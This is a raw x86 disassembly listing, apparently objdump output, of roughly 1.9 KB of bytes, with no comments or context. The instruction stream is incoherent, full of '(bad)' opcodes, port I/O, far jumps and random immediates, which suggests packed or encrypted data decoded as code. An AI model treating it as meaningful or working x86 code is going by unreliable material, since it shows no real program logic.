  41ee42:	pop    edx
  41ee43:	xchg   edx,eax
  41ee44:	xlat   BYTE PTR ds:[ebx]
  41ee45:	test   bl,bl
  41ee47:	in     eax,dx
  41ee48:	dec    ch
  41ee4a:	rcr    DWORD PTR ds:0x6dd75a88,1
  41ee50:	mov    esp,0xf402c6d0
  41ee55:	pusha  
  41ee56:	add    eax,0x7f59281c
  41ee5b:	xchg   esi,eax
  41ee5c:	jge    0x41edfd
  41ee5e:	leave  
  41ee5f:	cmp    ebx,ecx
  41ee61:	and    dl,0xce
  41ee64:	nop
  41ee65:	stc    
  41ee66:	add    DWORD PTR [edi],ecx
  41ee68:	sub    BYTE PTR [edi],al
  41ee6a:	test   eax,0x6d7721ec
  41ee6f:	arpl   cx,sp
  41ee71:	std    
  41ee72:	xlat   BYTE PTR ds:[ebx]
  41ee73:	xchg   esp,edi
  41ee75:	pop    esi
  41ee76:	lea    edx,[ecx]
  41ee78:	ret    0x17b3
  41ee7b:	and    al,0x65
  41ee7d:	push   0xfffffff5
  41ee7f:	mov    esi,0xed0200ab
  41ee84:	lods   al,BYTE PTR ds:[esi]
  41ee85:	popa   
  41ee86:	in     eax,dx
  41ee87:	cdq    
  41ee88:	repnz call 0xc317:0xf3d4d477
  41ee90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee91:	push   eax
  41ee92:	fwait
  41ee93:	mov    ds:0xbc2dd40d,eax
  41ee98:	add    dh,0x24
  41ee9b:	jge    0x41ee99
  41ee9d:	dec    esi
  41ee9e:	outs   dx,BYTE PTR ds:[esi]
  41ee9f:	cmp    cl,BYTE PTR [eax]
  41eea1:	xlat   BYTE PTR ds:[bx]
  41eea3:	cli    
  41eea4:	je     0x41eeb9
  41eea6:	repz dec ebp
  41eea8:	scas   eax,DWORD PTR es:[edi]
  41eea9:	dec    esi
  41eeaa:	mov    ds:0x9019f322,eax
  41eeaf:	sbb    bl,BYTE PTR [edi+0x1f2cbc37]
  41eeb5:	outs   dx,DWORD PTR ds:[esi]
  41eeb6:	inc    ebp
  41eeb7:	std    
  41eeb8:	adc    cl,BYTE PTR [esi+ecx*1+0x594f5bbe]
  41eebf:	mov    esp,0x3d6c8495
  41eec4:	mov    esp,0x5fa00ac4
  41eec9:	fidiv  DWORD PTR [ebx+0x13fb831b]
  41eecf:	jmp    0xf8b6:0x9fa82455
  41eed6:	xchg   edx,eax
  41eed7:	loopne 0x41eed9
  41eed9:	adc    BYTE PTR [edx+0x41],bh
  41eedc:	sti    
  41eedd:	mov    ds:0x9bb2ed89,al
  41eee2:	idiv   BYTE PTR [edx-0x30]
  41eee5:	out    dx,al
  41eee6:	or     al,0x6b
  41eee8:	or     BYTE PTR [edx+0x1d],bh
  41eeeb:	fisttp QWORD PTR [ecx+0x43]
  41eeee:	mov    bl,0x78
  41eef0:	mov    edi,0x596a3b86
  41eef5:	xchg   edi,eax
  41eef6:	stc    
  41eef7:	repz popf 
  41eef9:	ror    DWORD PTR [ecx-0x3e],1
  41eefc:	addr16 out 0xde,al
  41eeff:	adc    esi,DWORD PTR [edi-0x6404dc7a]
  41ef05:	push   ebp
  41ef06:	loop   0x41ef0d
  41ef08:	je     0x41ef6f
  41ef0a:	call   DWORD PTR [ebx+0x44]
  41ef0d:	xchg   DWORD PTR [esi+0xe],esp
  41ef10:	mov    BYTE PTR [edx+0x4b],bh
  41ef13:	push   edx
  41ef14:	in     eax,0xbd
  41ef16:	jmp    0x7e82140f
  41ef1b:	and    bh,BYTE PTR [eax-0x5e203ea]
  41ef21:	leave  
  41ef22:	stos   BYTE PTR es:[edi],al
  41ef23:	jae    0x41eef6
  41ef25:	or     edx,DWORD PTR [eax+ecx*8]
  41ef28:	xlat   BYTE PTR ds:[ebx]
  41ef29:	(bad)  
  41ef2b:	adc    DWORD PTR [esi-0xd],ecx
  41ef2e:	dec    ebp
  41ef2f:	pop    ebx
  41ef30:	and    al,ch
  41ef32:	fwait
  41ef33:	inc    ebp
  41ef34:	adc    DWORD PTR ds:0x33c5730,eax
  41ef3a:	fsub   st,st(1)
  41ef3c:	push   edi
  41ef3d:	dec    edi
  41ef3e:	out    0xbe,eax
  41ef40:	mov    bh,0xb9
  41ef42:	jle    0x41ef2e
  41ef44:	ficomp WORD PTR [esi-0x3b]
  41ef47:	mov    eax,0x870d6769
  41ef4c:	push   ebx
  41ef4d:	retf   0x64f9
  41ef50:	in     al,0x17
  41ef52:	dec    edi
  41ef53:	leave  
  41ef54:	in     eax,dx
  41ef55:	imul   ebx,DWORD PTR [eax-0x19],0x61
  41ef59:	mov    dl,0xe0
  41ef5b:	adc    BYTE PTR [ebx+edx*8],dh
  41ef5e:	sub    DWORD PTR [ebx],edi
  41ef60:	inc    eax
  41ef61:	and    DWORD PTR [eax+0x2dd0ea1d],ecx
  41ef67:	aas    
  41ef68:	inc    ebx
  41ef69:	mov    cl,0xcb
  41ef6b:	jmp    0x98f1:0xde1d2c0b
  41ef72:	fisubr DWORD PTR [edi+0x35]
  41ef75:	mov    dl,0xa
  41ef77:	loop   0x41efcb
  41ef79:	stc    
  41ef7a:	dec    esp
  41ef7b:	xchg   ebp,eax
  41ef7c:	push   ebp
  41ef7d:	jl     0x41efae
  41ef7f:	nop
  41ef80:	or     eax,0x2ee88d95
  41ef85:	xchg   edi,eax
  41ef86:	sub    cl,BYTE PTR [edx-0x6069e842]
  41ef8c:	sub    dh,BYTE PTR [esp+esi*2-0x4509a6db]
  41ef93:	jg     0x41f00a
  41ef95:	xor    eax,DWORD PTR [edx]
  41ef97:	icebp  
  41ef98:	adc    BYTE PTR [ecx],ah
  41ef9a:	jnp    0x41f013
  41ef9c:	add    BYTE PTR ss:[eax-0x5d],0x7c
  41efa1:	aam    0xdc
  41efa3:	jle    0x41ef88
  41efa5:	mov    DWORD PTR [esi],esp
  41efa7:	or     esp,ebp
  41efa9:	mov    ebp,0x2d75dd1f
  41efae:	lds    ecx,FWORD PTR [esp+esi*1+0x41]
  41efb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efb3:	push   esp
  41efb4:	fimul  DWORD PTR [ebp+esi*4-0x70]
  41efb8:	jo     0x41f020
  41efba:	xchg   edx,edi
  41efbc:	mov    al,0x13
  41efbe:	pop    ebp
  41efbf:	xchg   esi,eax
  41efc0:	outs   dx,BYTE PTR ds:[esi]
  41efc1:	mov    bh,0x20
  41efc3:	cwde   
  41efc4:	pop    eax
  41efc5:	mov    DWORD PTR [edi-0x47],esi
  41efc8:	jno    0x41f015
  41efca:	std    
  41efcb:	jb     0x41efd9
  41efcd:	pop    es
  41efce:	sbb    al,0xdf
  41efd0:	sub    eax,0x205c9a6d
  41efd5:	lods   al,BYTE PTR ds:[esi]
  41efd6:	inc    esi
  41efd7:	dec    ebp
  41efd8:	mov    al,0xf6
  41efda:	scas   eax,DWORD PTR es:[edi]
  41efdb:	mov    bh,0x23
  41efdd:	out    dx,al
  41efde:	mov    esp,0xd436f44
  41efe3:	xchg   edx,eax
  41efe4:	mov    ch,0x1b
  41efe6:	xchg   ebp,eax
  41efe7:	pushf  
  41efe8:	test   al,0xb0
  41efea:	clc    
  41efeb:	dec    eax
  41efec:	aas    
  41efed:	or     al,0xa3
  41efef:	and    ebp,DWORD PTR [esi-0x5706bd4e]
  41eff5:	cmp    dh,al
  41eff7:	sbb    BYTE PTR [esi+0x5e30b377],0x2e
  41effe:	(bad)
  41f001:	inc    ebp
  41f002:	enter  0xa909,0xbc
  41f006:	pop    ecx
  41f007:	arpl   WORD PTR [edi-0x73d56d1b],si
  41f00d:	(bad)
  41f011:	mov    ebx,DWORD PTR [eax+0x6]
  41f014:	push   eax
  41f015:	mov    ch,0xb8
  41f017:	mov    bh,0x20
  41f019:	icebp  
  41f01a:	dec    edi
  41f01b:	jge    0x41efdf
  41f01d:	jecxz  0x41f099
  41f01f:	pop    esp
  41f020:	aam    0xcd
  41f022:	or     BYTE PTR [eax-0x5ad2faa0],cl
  41f028:	add    al,0x8a
  41f02a:	mov    esp,0xf546f997
  41f02f:	and    dh,dh
  41f031:	rcl    esp,0x81
  41f034:	les    esp,FWORD PTR [eax+0x357277ca]
  41f03a:	repz (bad) 
  41f03c:	popf   
  41f03d:	pop    ss
  41f03e:	inc    esi
  41f03f:	icebp  
  41f040:	mov    eax,ds:0xe5b6109b
  41f045:	jb     0x41f083
  41f047:	lahf   
  41f048:	inc    esi
  41f049:	sub    dh,bh
  41f04b:	into   
  41f04c:	shr    DWORD PTR [ebp-0x1c1f31bc],1
  41f052:	push   cs
  41f053:	jb     0x41f038
  41f055:	cs out dx,al
  41f057:	aas    
  41f058:	int3   
  41f059:	inc    edi
  41f05a:	pop    ds
  41f05b:	ins    DWORD PTR es:[edi],dx
  41f05c:	shl    DWORD PTR [edx],0x8b
  41f05f:	dec    esi
  41f060:	push   esp
  41f061:	xor    edi,DWORD PTR [ecx+0x1b401a6f]
  41f067:	int3   
  41f068:	sbb    eax,DWORD PTR [di]
  41f06b:	mov    DWORD PTR [ebp-0x8ccc15],0xb6e923f2
  41f075:	idiv   dh
  41f077:	and    bl,BYTE PTR [esi+0x19]
  41f07a:	lea    edx,[edi+0x209cea09]
  41f080:	and    BYTE PTR [ecx-0x10],bh
  41f083:	dec    ebp
  41f084:	sbb    eax,0x4d142e10
  41f089:	sbb    DWORD PTR [esi-0x3745c42f],eax
  41f08f:	mov    al,ds:0xd6bacb04
  41f094:	jge    0x41f06a
  41f096:	in     eax,dx
  41f097:	loope  0x41f082
  41f099:	pushf  
  41f09a:	pop    es
  41f09b:	into   
  41f09c:	sub    eax,0xc1bddc20
  41f0a1:	jno    0x41f0bf
  41f0a3:	jo     0x41f0d8
  41f0a5:	arpl   bx,si
  41f0a7:	xchg   ebp,eax
  41f0a8:	pop    ecx
  41f0a9:	retf   0x8c5
  41f0ac:	xchg   BYTE PTR [ebp-0x24],bl
  41f0af:	inc    esp
  41f0b0:	pop    DWORD PTR [eax-0x16]
  41f0b3:	push   edi
  41f0b4:	cmp    al,0xad
  41f0b6:	outs   dx,DWORD PTR ds:[esi]
  41f0b7:	fucomp st(4)
  41f0b9:	push   es
  41f0ba:	cmp    eax,0x129c0a39
  41f0bf:	mov    eax,ds:0xbc24ec83
  41f0c4:	mov    ch,0x95
  41f0c6:	jo     0x41f0ac
  41f0c8:	aas    
  41f0c9:	pop    ebp
  41f0ca:	fbld   TBYTE PTR [ebx-0xe]
  41f0cd:	xchg   ebx,eax
  41f0ce:	mov    cl,0x36
  41f0d0:	push   ds
  41f0d1:	add    ch,BYTE PTR [eax-0x54]
  41f0d4:	adc    al,0x86
  41f0d6:	lea    ebx,[eax]
  41f0d8:	or     edx,DWORD PTR [eax+0x1a61a9ec]
  41f0de:	cmp    ch,ah
  41f0e0:	popf   
  41f0e1:	test   BYTE PTR [ebp+eax*1-0x3e],ch
  41f0e5:	es mov cl,0xd0
  41f0e8:	nop
  41f0e9:	mov    ah,0xee
  41f0eb:	dec    edx
  41f0ec:	and    ecx,0xae375466
  41f0f2:	cwde   
  41f0f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0f4:	ss aas 
  41f0f6:	ficom  DWORD PTR [eax-0x33]
  41f0f9:	rcr    BYTE PTR [edx+0x663e4550],1
  41f0ff:	add    esi,0xd32cffe8
  41f105:	adc    DWORD PTR [ebp+0x53],ebp
  41f108:	retf   0x998b
  41f10b:	jno    0x41f119
  41f10d:	in     eax,dx
  41f10e:	(bad)  
  41f10f:	out    dx,al
  41f110:	cmp    esi,DWORD PTR [ebp-0x243add45]
  41f116:	add    BYTE PTR [esi+ebp*1],0xf7
  41f11a:	fld    QWORD PTR [edi+ecx*8]
  41f11d:	and    al,0x34
  41f11f:	dec    edx
  41f120:	jo     0x41f0d7
  41f122:	aam    0xc5
  41f124:	mov    ds:0x709666a0,al
  41f129:	in     al,0x6a
  41f12b:	pop    ss
  41f12c:	lahf   
  41f12d:	jp     0x41f10b
  41f12f:	mov    ah,0xb0
  41f131:	cld    
  41f132:	pop    es
  41f133:	les    esp,FWORD PTR [edx]
  41f135:	mov    edi,0x2dc5c170
  41f13a:	add    BYTE PTR [eax-0xbd70a3],0x25
  41f141:	mov    WORD PTR [bx+di+0x7ed3],gs
  41f146:	inc    ebx
  41f147:	jnp    0x41f194
  41f149:	loope  0x41f146
  41f14b:	sub    eax,0x1b6e7eba
  41f150:	sar    ebp,0x20
  41f153:	add    edx,DWORD PTR [esi+0x8]
  41f156:	fidivr WORD PTR [ebx+0x5b4d81e3]
  41f15c:	loopne 0x41f126
  41f15e:	arpl   WORD PTR [edi+0x2a],ax
  41f161:	cmp    eax,DWORD PTR [eax]
  41f163:	fistp  QWORD PTR [ecx-0x61]
  41f166:	sbb    ch,BYTE PTR [edx-0x6c]
  41f169:	adc    BYTE PTR [edx],ah
  41f16b:	pop    esp
  41f16c:	fadd   DWORD PTR [edi+0x7d1c5672]
  41f172:	push   es
  41f173:	push   ecx
  41f174:	das    
  41f175:	xor    al,0xb5
  41f177:	dec    eax
  41f178:	sti    
  41f179:	inc    edi
  41f17a:	dec    edi
  41f17b:	or     dl,BYTE PTR [ecx]
  41f17d:	mov    al,ds:0x7a843c4a
  41f182:	outs   dx,DWORD PTR ds:[esi]
  41f183:	inc    ebx
  41f184:	mov    ah,0x9
  41f186:	jnp    0x41f12c
  41f188:	idiv   DWORD PTR [esi]
  41f18a:	and    DWORD PTR [ecx+0x77a7eadd],edi
  41f190:	out    0xb4,eax
  41f192:	mov    bl,0xf4
  41f194:	(bad)  
  41f195:	xor    esp,esi
  41f197:	pop    esi
  41f198:	xchg   ebx,eax
  41f199:	gs dec edi
  41f19b:	adc    esp,edx
  41f19d:	leave  
  41f19e:	sbb    eax,DWORD PTR [ecx-0x69]
  41f1a1:	mov    eax,ds:0x906b0281
  41f1a6:	dec    ebp
  41f1a7:	aaa    
  41f1a8:	sbb    BYTE PTR [esi],ah
  41f1aa:	fiadd  WORD PTR [ebp+0x3f]
  41f1ad:	rcr    di,1
  41f1b0:	xor    BYTE PTR [edx-0x63],ah
  41f1b3:	mov    ch,0xe2
  41f1b5:	push   ebp
  41f1b6:	dec    ebx
  41f1b7:	out    0x42,al
  41f1b9:	mov    al,ds:0x8b954af0
  41f1be:	(bad)  
  41f1bf:	repnz cdq 
  41f1c1:	fistp  WORD PTR [ebx]
  41f1c3:	fdiv   DWORD PTR [eax+edx*4-0x4b3ef232]
  41f1ca:	pop    es
  41f1cb:	lods   al,BYTE PTR ds:[esi]
  41f1cc:	fstp   QWORD PTR [edx+0x44]
  41f1cf:	sar    BYTE PTR [edi+0x54],cl
  41f1d2:	fisttp WORD PTR [ebx-0x2b18df71]
  41f1d8:	test   BYTE PTR [esp+ebx*4],cl
  41f1db:	repz push es
  41f1dd:	out    0xf3,eax
  41f1df:	add    cl,ch
  41f1e1:	jecxz  0x41f243
  41f1e3:	adc    ebp,ecx
  41f1e5:	ins    DWORD PTR es:[edi],dx
  41f1e6:	aaa    
  41f1e7:	ins    DWORD PTR es:[edi],dx
  41f1e8:	popa   
  41f1e9:	and    cl,BYTE PTR [eax-0xb]
  41f1ec:	out    dx,eax
  41f1ed:	scas   eax,DWORD PTR es:[edi]
  41f1ee:	scas   al,BYTE PTR es:[edi]
  41f1ef:	(bad)  
  41f1f0:	fsubr  st,st(1)
  41f1f2:	cmp    esp,ecx
  41f1f4:	and    esi,DWORD PTR [eax+0x1715b29a]
  41f1fa:	test   BYTE PTR [ecx+0x4be6ed62],al
  41f200:	dec    esi
  41f201:	inc    eax
  41f202:	mov    WORD PTR [ecx+ebp*8-0x30],ds
  41f206:	sti    
  41f207:	nop
  41f208:	sub    DWORD PTR [edi],ecx
  41f20a:	and    BYTE PTR [esi],al
  41f20c:	repnz mov ebp,0x9474d15b
  41f212:	aam    0xc2
  41f214:	cmp    al,0xae
  41f216:	sub    ch,dl
  41f218:	jbe    0x41f1d1
  41f21a:	inc    eax
  41f21b:	aad    0xa9
  41f21d:	sar    DWORD PTR [ebp+0x6ee9e55b],0xcf
  41f224:	cmp    ch,BYTE PTR ds:0x1328d178
  41f22a:	xor    al,0x50
  41f22c:	(bad)  
  41f22d:	xchg   ecx,eax
  41f22e:	sbb    eax,0x896870c
  41f233:	push   eax
  41f234:	adc    eax,0x7c368506
  41f239:	lds    ebx,FWORD PTR [edx+0x25d05f2c]
  41f23f:	arpl   WORD PTR [ebp-0xd4f9af8],sp
  41f245:	in     al,0x5e
  41f247:	stc    
  41f248:	adc    BYTE PTR [edi-0x556ed07a],0x27
  41f24f:	enter  0x94af,0x7
  41f253:	hlt    
  41f254:	xadd   DWORD PTR [edi-0x6c],ebp
  41f258:	xchg   esi,eax
  41f259:	xchg   edi,eax
  41f25a:	push   ss
  41f25b:	sbb    ebx,ebx
  41f25d:	cmp    BYTE PTR [ebp-0x3c],bh
  41f260:	or     edi,esp
  41f262:	aam    0xd
  41f264:	es cmc 
  41f266:	mov    dh,0xca
  41f268:	lods   eax,DWORD PTR ds:[esi]
  41f269:	or     DWORD PTR [ebx+0x62fa2e4],esi
  41f26f:	retf   
  41f270:	xchg   ebp,eax
  41f271:	retf   0x4c0f
  41f274:	add    BYTE PTR [edx+0x45],dh
  41f277:	(bad)  
  41f278:	loopne 0x41f298
  41f27a:	loope  0x41f2ef
  41f27c:	pop    ecx
  41f27d:	retf   
  41f27e:	hlt    
  41f27f:	call   0xe315:0xd084f09d
  41f286:	cmp    eax,0x87cae215
  41f28b:	and    al,0x46
  41f28d:	inc    esp
  41f28e:	mov    edi,0xe9d4971d
  41f293:	dec    edx
  41f294:	mov    DWORD PTR [edi+0x59],esp
  41f297:	adc    eax,0x8f188b38
  41f29c:	cmp    al,al
  41f29e:	ins    BYTE PTR es:[edi],dx
  41f29f:	ds mov bh,0x89
  41f2a2:	int3   
  41f2a3:	cmp    al,0x2f
  41f2a5:	sub    ah,BYTE PTR [esi+ebp*8-0x200525d5]
  41f2ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2ad:	enter  0xe51,0x77
  41f2b1:	xchg   edi,eax
  41f2b2:	call   0x8a47792d
  41f2b7:	out    0xaa,eax
  41f2b9:	jl     0x41f28a
  41f2bb:	xor    edi,DWORD PTR [esi-0x77b7c61d]
  41f2c1:	mov    bx,0x1ca0
  41f2c5:	iret   
  41f2c6:	push   ds
  41f2c7:	and    ebp,DWORD PTR [eax+ebx*2-0x2c876949]
  41f2ce:	loop   0x41f2d2
  41f2d0:	mov    al,0xc6
  41f2d2:	xchg   ebp,eax
  41f2d3:	xor    bl,dh
  41f2d5:	inc    esi
  41f2d6:	(bad)  
  41f2d7:	mov    ecx,0x3c460780
  41f2dc:	inc    ebx
  41f2dd:	lahf   
  41f2de:	xchg   esi,eax
  41f2df:	retf   
  41f2e0:	fidiv  DWORD PTR [ebp-0x2fa1a9c0]
  41f2e6:	cwde   
  41f2e7:	add    eax,DWORD PTR [eiz*8-0x1af6eed0]
  41f2ee:	fild   QWORD PTR [edx]
  41f2f0:	add    BYTE PTR [edx+esi*4],cl
  41f2f3:	push   ebx
  41f2f4:	push   esp
  41f2f5:	cmc    
  41f2f6:	ret    0x1a5
  41f2f9:	in     al,0x78
  41f2fb:	ss in  al,0xe2
  41f2fe:	push   ecx
  41f2ff:	and    dh,BYTE PTR [ebx]
  41f301:	test   BYTE PTR [esi],bh
  41f303:	push   0xb9a01d6a
  41f308:	jle    0x41f32b
  41f30a:	stos   BYTE PTR es:[edi],al
  41f30b:	push   es
  41f30c:	and    eax,eax
  41f30e:	mov    bh,0x9a
  41f310:	mov    edi,0x408dd7e9
  41f315:	(bad)  
  41f317:	fmul   QWORD PTR [edi+0x1c]
  41f31a:	imul   eax,DWORD PTR [ebp-0x5b],0x50a5f5f7
  41f321:	in     eax,dx
  41f322:	inc    ecx
  41f323:	mov    al,ds:0x591deb6
  41f328:	pusha  
  41f329:	addr16 push esp
  41f32b:	add    BYTE PTR [eax-0x56b83f41],0xee
  41f332:	dec    ebx
  41f333:	mov    eax,ds:0xa4e9a41a
  41f338:	pushf  
  41f339:	mov    esp,DWORD PTR [ebx+0x79471a37]
  41f33f:	mov    bl,0xcd
  41f341:	frstor ds:0xec1732bf
  41f347:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f348:	(bad)  
  41f349:	pop    edx
  41f34a:	push   0x51
  41f34c:	adc    DWORD PTR [eax+edi*8],ebx
  41f34f:	or     ebx,0x10
  41f352:	jmp    0xf778:0x279d3ed3
  41f359:	dec    esi
  41f35a:	add    eax,0x8047cb29
  41f35f:	pusha  
  41f360:	and    ebp,DWORD PTR [ecx-0x784c57b9]
  41f366:	(bad)  
  41f367:	loop   0x41f3c2
  41f369:	sbb    ecx,DWORD PTR [ebx+0x1c]
  41f36c:	adc    DWORD PTR [ecx-0x5af86ab4],0x6fec7799
  41f376:	(bad)  
  41f377:	xchg   ecx,eax
  41f378:	add    eax,0x799e9aa1
  41f37d:	sbb    BYTE PTR [esp+eiz*2-0x73dc4d7],0x71
  41f385:	add    DWORD PTR [eax+0xf0ef47a],esi
  41f38b:	pop    ss
  41f38c:	jno    0x41f34d
  41f38e:	(bad)  
  41f38f:	mov    ecx,0xfbfea3ca
  41f394:	jge    0x41f3f9
  41f396:	or     BYTE PTR [eax+0x67],cl
  41f399:	jae    0x41f39f
  41f39b:	stos   BYTE PTR es:[edi],al
  41f39c:	cmc    
  41f39d:	push   0xfde64033
  41f3a2:	xchg   edx,eax
  41f3a3:	popa   
  41f3a4:	aaa    
  41f3a5:	adc    BYTE PTR [bx+si+0x7386],dh
  41f3aa:	jns    0x41f3da
  41f3ac:	push   cs
  41f3ad:	loop   0x41f37d
  41f3af:	retf   0xed4d
  41f3b2:	adc    DWORD PTR [edx+ebx*2],edx
  41f3b5:	push   cs
  41f3b6:	bound  eax,QWORD PTR [eax-0x64237e0e]
  41f3bc:	and    cl,BYTE PTR [ecx]
  41f3be:	dec    esp
  41f3bf:	adc    eax,0xe24c1542
  41f3c4:	imul   ebx,DWORD PTR [ecx+eiz*1],0x24
  41f3c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3c9:	imul   esi,DWORD PTR ds:0xc9cbd643,0xffffffbe
  41f3d0:	loop   0x41f3a8
  41f3d2:	adc    esp,ecx
  41f3d4:	lahf   
  41f3d5:	(bad)  
  41f3d7:	sub    eax,0x7ca5bf1a
  41f3dc:	cdq    
  41f3dd:	adc    BYTE PTR [eax+0x49],bh
  41f3e0:	xlat   BYTE PTR ds:[ebx]
  41f3e1:	bound  edx,QWORD PTR [edx+0x34dffa78]
  41f3e7:	push   cs
  41f3e8:	cdq    
  41f3e9:	lahf   
  41f3ea:	sub    BYTE PTR [ebx],bh
  41f3ec:	hlt    
  41f3ed:	daa    
  41f3ee:	jne    0x41f3ea
  41f3f0:	pushf  
  41f3f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3f2:	adc    esp,esp
  41f3f4:	sub    bh,BYTE PTR [ebx+0x1df3f1a7]
  41f3fa:	sbb    eax,0xd907a6d8
  41f3ff:	adc    edi,DWORD PTR [ecx+edx*1]
  41f402:	shr    DWORD PTR [esi],0x43
  41f405:	scas   al,BYTE PTR es:[edi]
  41f406:	sub    BYTE PTR [edi],al
  41f408:	jmp    0xd4be5418
  41f40d:	cmp    al,0x12
  41f40f:	shrd   DWORD PTR [ecx+0x1e],edx,0x48
  41f414:	cwde   
  41f415:	icebp  
  41f416:	cmp    ecx,ebp
  41f418:	adc    cl,bl
  41f41a:	pop    ds
  41f41b:	dec    eax
  41f41c:	retf   0xa590
  41f41f:	fdivr  st(3),st
  41f421:	ins    DWORD PTR es:[edi],dx
  41f422:	pop    es
  41f423:	jns    0x41f3a8
  41f425:	xchg   esp,eax
  41f426:	scas   eax,DWORD PTR es:[edi]
  41f427:	add    al,0x28
  41f429:	mov    esi,0x12af72ec
  41f42e:	push   ecx
  41f42f:	in     al,dx
  41f430:	pop    esp
  41f431:	push   0x51
  41f433:	mov    al,BYTE PTR [esi]
  41f435:	out    dx,al
  41f436:	call   FWORD PTR [edi]
  41f438:	fwait
  41f439:	repnz in eax,0x94
  41f43c:	xchg   esi,eax
  41f43d:	jb     0x41f3cd
  41f43f:	(bad)  
  41f440:	pushf  
  41f441:	dec    eax
  41f442:	fadd   QWORD PTR [eax]
  41f444:	test   DWORD PTR [edi+0x565e5edd],ecx
  41f44a:	pop    ecx
  41f44b:	xchg   ebp,eax
  41f44c:	and    DWORD PTR [edi],ebp
  41f44e:	jecxz  0x41f3e8
  41f450:	fwait
  41f451:	push   es
  41f452:	sbb    BYTE PTR fs:[edx],0xf2
  41f456:	mov    dl,BYTE PTR [edx+0x1c2f6b4a]
  41f45c:	call   0x9ea6:0x8807f845
  41f463:	xor    dh,0x54
  41f466:	retf   
  41f467:	out    0x59,al
  41f469:	fwait
  41f46a:	mov    eax,0x1110633f
  41f46f:	and    ch,BYTE PTR [ebx]
  41f471:	loop   0x41f4c0
  41f473:	(bad)  
  41f474:	or     ebp,DWORD PTR [ebx+0x67b038f3]
  41f47a:	out    0xa,al
  41f47c:	(bad)  
  41f47d:	aam    0xdd
  41f47f:	sbb    esp,edx
  41f481:	cld    
  41f482:	xchg   esp,eax
  41f483:	leave  
  41f484:	iret   
  41f485:	adc    al,0x99
  41f487:	push   esp
  41f488:	push   ss
  41f489:	mov    al,ds:0xf8b99b8a
  41f48e:	and    al,0x20
  41f490:	sbb    al,0x2
  41f492:	in     eax,dx
  41f493:	outs   dx,DWORD PTR ds:[esi]
  41f494:	push   ebp
  41f495:	in     eax,0xee
  41f497:	nop
  41f498:	cwde   
  41f499:	popf   
  41f49a:	(bad)  
  41f49b:	mov    ah,0xba
  41f49d:	jo     0x41f47d
  41f49f:	add    al,al
  41f4a1:	cmp    BYTE PTR [edx-0x61],bl
  41f4a4:	add    DWORD PTR [ebp+0x4a],ebp
  41f4a7:	or     cl,BYTE PTR [ebp-0x48de8722]
  41f4ad:	or     eax,0x4d322775
  41f4b2:	mov    ebx,0x6538e260
  41f4b7:	xlat   BYTE PTR ds:[ebx]
  41f4b8:	idiv   BYTE PTR [esi-0x6c]
  41f4bb:	pop    ds
  41f4bc:	(bad)  
  41f4bd:	xlat   BYTE PTR ds:[ebx]
  41f4be:	sub    DWORD PTR [ebx+0x3e],esp
  41f4c1:	ins    DWORD PTR es:[edi],dx
  41f4c2:	dec    edx
  41f4c3:	or     esi,DWORD PTR [edi+0x5d08e8eb]
  41f4c9:	fidiv  WORD PTR [edi+0x20336dea]
  41f4cf:	ins    DWORD PTR es:[edi],dx
  41f4d0:	aam    0x72
  41f4d2:	push   0x18
  41f4d4:	xor    al,0x77
  41f4d6:	sbb    BYTE PTR [eax],ch
  41f4d8:	pusha  
  41f4d9:	mov    ebx,0xf340c8f2
  41f4de:	sbb    esi,DWORD PTR [esi-0x2c1f1e02]
  41f4e4:	xchg   ecx,eax
  41f4e5:	mov    edi,DWORD PTR [esi+0x4f72017c]
  41f4eb:	dec    esi
  41f4ec:	pop    ss
  41f4ed:	ficom  DWORD PTR ss:[eax-0x56d2bd56]
  41f4f4:	fldcw  WORD PTR [edi-0x48124232]
  41f4fa:	hlt    
  41f4fb:	stos   DWORD PTR es:[edi],eax
  41f4fc:	sub    dh,BYTE PTR [ebp+0x27487e1b]
  41f502:	push   ecx
  41f503:	and    al,0x54
  41f505:	in     eax,0xd3
  41f507:	pushf  
  41f508:	mov    cl,0x28
  41f50a:	fmul   DWORD PTR [eax-0x41]
  41f50d:	out    0x93,al
  41f50f:	jnp    0x59af4f60
  41f515:	das    
  41f516:	retf   
  41f517:	cmc    
  41f518:	es mov dl,0x79
  41f51b:	outs   dx,BYTE PTR ds:[esi]
  41f51c:	mov    eax,ds:0x79a08ef6
  41f521:	fiadd  WORD PTR [edx-0x4e0eec7]
  41f527:	inc    ecx
  41f528:	int3   
  41f529:	mov    ecx,0x525d514a
  41f52e:	out    0x9d,al
  41f530:	pushf  
  41f531:	adc    edx,DWORD PTR [esi]
  41f533:	sub    DWORD PTR [eax],edx
  41f535:	stc    
  41f536:	ja     0x41f531
  41f538:	aas    
  41f539:	aad    0x6b
  41f53b:	cmp    eax,0xa0fb7cf0
  41f540:	mov    al,0x1f
  41f542:	aad    0x3c
  41f544:	cs call 0xf38004fa
  41f54a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f54b:	pop    ds
  41f54c:	push   ss
  41f54d:	stos   BYTE PTR es:[edi],al
  41f54e:	enter  0x91dc,0x5f
  41f552:	(bad)  
  41f553:	mov    edi,0x256d9422
  41f558:	add    BYTE PTR [ebp-0x4181f3f8],bl
  41f55e:	sbb    ebx,DWORD PTR [edx+0x390cfb18]
  41f564:	inc    edi
  41f565:	sahf   
  41f566:	shl    bl,0xe7
  41f569:	loop   0x41f5e6
  41f56b:	daa    
  41f56c:	xchg   BYTE PTR [edi+edi*4-0x6a],bl
  41f570:	and    dl,BYTE PTR ds:0xad85cac2
  41f576:	adc    BYTE PTR [ebx],dl
  41f578:	mov    bh,0x76
  41f57a:	cdq    
  41f57b:	xor    eax,0xdc8d9eae
  41f580:	pop    esp
  41f581:	daa    
  41f582:	ret    
  41f583:	inc    eax
  41f584:	imul   ecx,ebp,0x6637c094
  41f58a:	les    ebx,FWORD PTR [ebp+0x18]
  41f58d:	mov    esi,0x106cbbf4
  41f592:	ss mov dh,0x6f
  41f595:	loopne 0x41f53e
  41f597:	jns    0x41f5d5
  41f599:	stc    
  41f59a:	dec    eax
  41f59b:	cli    
  41f59c:	ret    
  41f59d:	ins    DWORD PTR es:[edi],dx
  41f59e:	repnz and ebp,DWORD PTR [ebx]
  41f5a1:	push   edi
